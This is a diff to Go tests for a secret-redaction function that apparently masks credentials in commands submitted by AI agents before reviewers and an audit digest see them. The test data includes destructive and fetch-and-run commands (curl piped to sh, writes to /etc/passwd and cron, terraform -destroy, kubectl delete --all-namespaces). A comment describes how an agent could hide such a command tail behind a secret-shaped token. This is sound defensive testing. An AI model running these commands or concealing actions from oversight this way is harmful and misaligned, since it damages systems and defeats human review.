@@ -66,7 +66,10 @@ func TestRedactAssignmentsStaysLinear(t *testing.T) {
 	t.Parallel()
 	// Both separators can chain, so both are guarded: the equals form the ini pattern reads and the
 	// colon form the yaml pattern reads, each the shape that maximized the old rewind's rescanning.
-	for _, in := range []string{strings.Repeat("a=", 500000), strings.Repeat("a:", 500000)} {
+	// The last two are one long line of assignments each read as one word, where finding the start
+	// of the line by scanning back from every value made the scan quadratic.
+	for _, in := range []string{strings.Repeat("a=", 500000), strings.Repeat("a:", 500000),
+		"x " + strings.Repeat("a: b ", 1000000), strings.Repeat("a=b ", 1250000)} {
 		got, _ := RedactAssignments(in, "X")
 		// No secret keys, so nothing is masked and the text returns unchanged. The point is that it
 		// returns at all, in linear time.
@@ -74,6 +77,178 @@ func TestRedactAssignmentsStaysLinear(t *testing.T) {
 			t.Errorf("a chain of non-secret assignments was altered: len(got)=%d, len(in)=%d",
 				len(got), len(in))
 		}
+	}
+}
+
+// TestRedactAssignmentsKeepsTheTailAfterASecret pins that a name: value secret inside a command
+// line masks one shell word, as a name=value secret does, so the command after it stays readable to
+// every reader below admin and stays inside the receipt digest taken over the masked text.
+//
+// Masking to the end of the line hid a redirect, a command substitution, a pipe, a widened limit,
+// and a destroy flag behind one secret-shaped token an agent chose to write, and two commands that
+// differed only there disclosed the same text under the same digest.
+func TestRedactAssignmentsKeepsTheTailAfterASecret(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		// In is the command as an agent submits it.
+		In string
+		// WantResult is the redaction.
+		WantResult string
+		// Tail is the part after the secret that must survive.
+		Tail string
+	}{{ // Test 0: A command substitution after the secret.
+		In:         "echo password: hunter2 $(curl -s http://e/x | sh)",
+		WantResult: "echo password: *** $(curl -s http://e/x | sh)", Tail: "$(curl -s http://e/x | sh)",
+	}, { // Test 1: A backtick substitution.
+		In: "echo password: hunter2 `id`", WantResult: "echo password: *** `id`", Tail: "`id`",
+	}, { // Test 2: A pipe into a file the command writes.
+		In:         "echo password: hunter2 | tee /etc/cron.d/x",
+		WantResult: "echo password: *** | tee /etc/cron.d/x", Tail: "| tee /etc/cron.d/x",
+	}, { // Test 3: A redirect, the shape the seat ran on the release binary.
+		In:         "echo password: hunter2 > /etc/passwd",
+		WantResult: "echo password: *** > /etc/passwd", Tail: "> /etc/passwd",
+	}, { // Test 4: A target and a destroy flag after a Terraform variable.
+		In:         "terraform apply -var db_password: hunter2 -target=module.prod -destroy",
+		WantResult: "terraform apply -var db_password: *** -target=module.prod -destroy",
+		Tail:       "-target=module.prod -destroy",
+	}, { // Test 5: A quoted extra var, whose quote already bounded the mask.
+		In:         "ansible-playbook site.yml -e 'db_password: hunter2' --limit all --tags wipe",
+		WantResult: "ansible-playbook site.yml -e 'db_password: ***' --limit all --tags wipe",
+		Tail:       "' --limit all --tags wipe",
+	}, { // Test 6: The name=value form, which already kept the tail.
+		In:         "ansible-playbook site.yml -e db_password=hunter2 --limit all --tags wipe",
+		WantResult: "ansible-playbook site.yml -e db_password=*** --limit all --tags wipe",
+		Tail:       "--limit all --tags wipe",
+	}, { // Test 7: An option written with a colon, then the whole fleet.
+		In:         "kubectl delete ns staging --token: hunter2 --all-namespaces --all",
+		WantResult: "kubectl delete ns staging --token: *** --all-namespaces --all",
+		Tail:       "--all-namespaces --all",
+	}, { // Test 8: A widened limit and a destroy tag.
+		In:         "deploy.sh password: hunter2 --limit all --tags destroy",
+		WantResult: "deploy.sh password: *** --limit all --tags destroy",
+		Tail:       "--limit all --tags destroy",
+	}, { // Test 9: A command on a later line of a script.
+		In:         "set -e\nrun.sh --ssh_pass: hunter2 --limit ALL --tags deploy,destroy",
+		WantResult: "set -e\nrun.sh --ssh_pass: *** --limit ALL --tags deploy,destroy",
+		Tail:       "--limit ALL --tags deploy,destroy",
+	}, { // Test 10: A quoted secret on a command line ends at its word.
+		In:         `deploy.sh api_key: "hunter2" --limit all`,
+		WantResult: `deploy.sh api_key: *** --limit all`, Tail: "--limit all",
+	}}
+	for testNum, test := range tests {
+		t.Run(fmt.Sprintf("test %d", testNum), func(t *testing.T) {
+			t.Parallel()
+			got, found := RedactAssignments(test.In, "***")
+			if diff := cmp.Diff(test.WantResult, got); diff != "" {
+				t.Errorf("RedactAssignments(%q) mismatch (-want +got):\n%s", test.In, diff)
+			}
+			if strings.Contains(got, "hunter2") {
+				t.Errorf("the secret survived redaction in %q", got)
+			}
+			if !strings.HasSuffix(got, test.Tail) {
+				t.Errorf("the command after the secret is gone from %q, want it to end %q", got, test.Tail)
+			}
+			if len(found) != 1 || found[0].Value != "hunter2" {
+				t.Errorf("found = %v, want the one secret reported as hunter2 for the run-log masker", found)
+			}
+			if twice, _ := RedactAssignments(got, "***"); twice != got {
+				t.Errorf("redacting %q again gave %q", got, twice)
+			}
+		})
+	}
+}
+
+// TestRedactAssignmentsReadsAYAMLEntryWide pins the contexts that keep the mask to the end of the
+// line or of the quoted string: a name: value that opens a YAML entry, a value nested inside one,
+// and a value inside a quoted string handed whole to another program. A YAML scalar holds spaces
+// without quotes, so reading one word there would leave the rest of a passphrase in the clear.
+func TestRedactAssignmentsReadsAYAMLEntryWide(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		// In is the text.
+		In string
+		// WantResult is the redaction.
+		WantResult string
+		// WantValue is the secret reported.
+		WantValue string
+	}{{ // Test 0: An entry at the start of the text.
+		In: "ansible_ssh_pass: two word secret", WantResult: "ansible_ssh_pass: X",
+		WantValue: "two word secret",
+	}, { // Test 1: An indented entry in a multi-line extra var.
+		In:         "db:\n  password: two word secret\n  user: app",
+		WantResult: "db:\n  password: X\n  user: app", WantValue: "two word secret",
+	}, { // Test 2: A sequence item.
+		In: "users:\n  - token: two word secret", WantResult: "users:\n  - token: X",
+		WantValue: "two word secret",
+	}, { // Test 3: A quoted name opening an entry.
+		In: `"password": two word secret`, WantResult: `"password": X`, WantValue: "two word secret",
+	}, { // Test 4: A secret nested inside an ordinary entry's value.
+		In:         "note: harmless then ansible_ssh_pass: two word secret",
+		WantResult: "note: harmless then ansible_ssh_pass: X", WantValue: "two word secret",
+	}, { // Test 5: A header inside a quoted string, which curl reads to the closing quote.
+		In:         `curl -H "Authorization: Bearer two word secret" https://api`,
+		WantResult: `curl -H "Authorization: X" https://api`, WantValue: "Bearer two word secret",
+	}, { // Test 6: A YAML scalar inside a quoted extra var.
+		In:         `ansible-playbook -e 'vault_password: two word secret' site.yml`,
+		WantResult: `ansible-playbook -e 'vault_password: X' site.yml`, WantValue: "two word secret",
+	}, { // Test 7: A quoted value of a name=value assignment, handed whole to the program it names.
+		In:         `OPTS="-H Authorization: Bearer two word secret" ./run --all`,
+		WantResult: `OPTS="-H Authorization: X" ./run --all`, WantValue: "Bearer two word secret",
+	}}
+	for testNum, test := range tests {
+		t.Run(fmt.Sprintf("test %d", testNum), func(t *testing.T) {
+			t.Parallel()
+			got, found := RedactAssignments(test.In, "X")
+			if diff := cmp.Diff(test.WantResult, got); diff != "" {
+				t.Errorf("RedactAssignments(%q) mismatch (-want +got):\n%s", test.In, diff)
+			}
+			if strings.Contains(got, "secret") {
+				t.Errorf("part of the passphrase survived redaction in %q", got)
+			}
+			var values []string
+			for _, a := range found {
+				values = append(values, a.Value)
+			}
+			if !slices.Contains(values, test.WantValue) {
+				t.Errorf("found values %q, want %q among them", values, test.WantValue)
+			}
+		})
+	}
+}
+
+// TestOpensEntry pins which text before a name makes the name open a YAML entry rather than sit
+// inside a command line.
+func TestOpensEntry(t *testing.T) {
+	t.Parallel()
+	tests := []struct {
+		// In is the text before the name on its line.
+		In string
+		// WantResult is whether the name opens an entry.
+		WantResult bool
+	}{
+		{In: "", WantResult: true},                              // Test 0: The start of a line.
+		{In: "    ", WantResult: true},                          // Test 1: Indentation.
+		{In: "\t", WantResult: true},                            // Test 2: A tab.
+		{In: "- ", WantResult: true},                            // Test 3: A sequence item.
+		{In: "  - - ", WantResult: true},                        // Test 4: Nested sequence items.
+		{In: `"`, WantResult: true},                             // Test 5: A quoted name.
+		{In: `- '`, WantResult: true},                           // Test 6: A quoted name in a sequence.
+		{In: "echo ", WantResult: false},                        // Test 7: A command before it.
+		{In: "--", WantResult: false},                           // Test 8: An option's dashes.
+		{In: "-", WantResult: false},                            // Test 9: One dash joined to the name.
+		{In: "-- ", WantResult: false},                          // Test 10: Two dashes then a space.
+		{In: "deploy; ", WantResult: false},                     // Test 11: A separator before it.
+		{In: `{"`, WantResult: false},                           // Test 12: A flow mapping.
+		{In: `-"`, WantResult: false},                           // Test 13: A dash joined to a quote.
+		{In: "kubectl delete ns staging --", WantResult: false}, // Test 14: The seat's option.
+	}
+	for testNum, test := range tests {
+		t.Run(fmt.Sprintf("test %d", testNum), func(t *testing.T) {
+			t.Parallel()
+			if diff := cmp.Diff(test.WantResult, opensEntry(test.In)); diff != "" {
+				t.Errorf("opensEntry(%q) mismatch (-want +got):\n%s", test.In, diff)
+			}
+		})
 	}
 }
 
@@ -556,6 +731,9 @@ func TestRedactAssignmentsStrayQuoteInEarlierValue(t *testing.T) {
 		In: `psql "password=" -c x`, WantResult: `psql "password=" -c x`,
 	}, { // Test 10: A quote that closes the string before a separator assigns nothing.
 		In: `sh -c "token=" && x`, WantResult: `sh -c "token=" && x`,
+	}, { // Test 11: A quote the line's count left open, which the value's own quotes show was an
+		// apostrophe, keeps the wide reading so redacting again reads the mask the same way.
+		In: `it's password: 'x y' --all`, WantResult: `it's password: X`, WantValue: "x y",
 	}}
 	for testNum, test := range tests {
 		t.Run(fmt.Sprintf("test %d", testNum), func(t *testing.T) {
